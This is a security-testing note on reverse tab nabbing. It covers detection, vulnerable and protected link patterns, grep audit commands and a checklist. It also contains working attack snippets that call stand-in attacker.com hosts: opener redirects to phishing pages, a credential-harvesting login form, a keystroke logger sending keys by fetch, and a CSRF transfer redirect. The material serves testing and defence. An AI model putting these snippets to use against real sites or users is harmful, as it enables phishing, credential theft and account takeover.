---
tags:
  - medium
  - client-side
---

# Reverse Tab Nabbing

When a link opens with `target="_blank"` without `rel="noopener"`, the new page can access `window.opener` and redirect the original tab to a phishing page.

## Quick Test

```html
<!-- Vulnerable link -->
<a href="https://attacker.com" target="_blank">Click me</a>

<!-- Attacker page redirects opener -->
<script>window.opener.location = "https://phishing-site.com/fake-login";</script>
```

**Test in new tab:**
```javascript
if (window.opener) {
  console.log("Vulnerable! Can access opener");
}
```

## Detection

1. Find `target="_blank"` links without `rel="noopener nofollow"`
2. Check for user-controlled hrefs (comments, profiles, external links)
3. Search patterns: `target="_blank"`, `window.open(`

## Attack Vectors

### Basic Tab Nabbing

**Vulnerable page (victim site):**
```html
<a href="http://attacker.com/malicious.html" target="_blank">
  Check out this link
</a>
```

**Attacker page (malicious.html):**
```html
<!DOCTYPE html>
<html>
<body>
<script>
  window.opener.location = "https://attacker.com/phishing.html";
</script>
<h1>Interesting Content</h1>
</body>
</html>
```

**Phishing page:**
```html
<h1>Your session expired. Please login again.</h1>
<form action="https://attacker.com/steal">
  <input name="username" placeholder="Username">
  <input name="password" type="password" placeholder="Password">
  <button>Login</button>
</form>
```

### Stealthy Redirect

```javascript
// Wait before redirect to avoid suspicion
setTimeout(() => {
  window.opener.location = "https://phishing.attacker.com/session-expired";
}, 5000);
```

### Same-Origin Full DOM Access

If same-origin (e.g., via XSS):

```javascript
if (window.opener) {
  // Monitor keystrokes
  window.opener.document.onkeypress = (e) => {
    fetch('https://attacker.com/log?key=' + e.key);
  };
  
  // Modify content
  window.opener.document.body.innerHTML = '<h1>Hacked!</h1>';
}
```

## Cross-Origin Limitations

**Same-origin:** Full DOM access (cookies, localStorage)

**Cross-origin (limited but dangerous):**
```javascript
window.opener.closed      // Is window closed?
window.opener.location = "..."  // CAN REDIRECT! (the vulnerability)
```

## Vulnerable Patterns

```html
<!-- Vulnerable -->
<a target="_blank">Link</a>
<a target="_blank" rel="opener">Link</a>
window.open(url)

<!-- Protected -->
<a target="_blank" rel="noopener noreferrer">Link</a>
window.open(url, '_blank', 'noopener,noreferrer')
```

## Attack Chains

**Tab Nabbing → Phishing → ATO:**
1. User clicks link on trusted site
2. New tab opens to attacker site
3. Original tab redirected to phishing clone
4. User "re-enters" credentials
5. Attacker captures credentials

**Tab Nabbing → CSRF:**
```javascript
// Redirect opener to CSRF payload
window.opener.location = "https://victim.com/transfer?to=attacker&amount=1000";
```

## Search Codebase

```bash
grep -r 'target="_blank"' --include="*.html" | grep -v 'noopener'
grep -r 'window.open' --include="*.js" | grep -v 'noopener'
```

## Modern Browser Note

Chrome 88+ implies `rel="noopener"` by default for `target="_blank"`, but don't rely on this — still test and report.

## Checklist

- [ ] Find all target="_blank" links
- [ ] Check for missing rel="noopener"
- [ ] Test user-controlled link hrefs
- [ ] Check window.open() calls
- [ ] Test opener access from new tab
- [ ] Verify cross-origin vs same-origin behavior
- [ ] Check if redirect to phishing possible
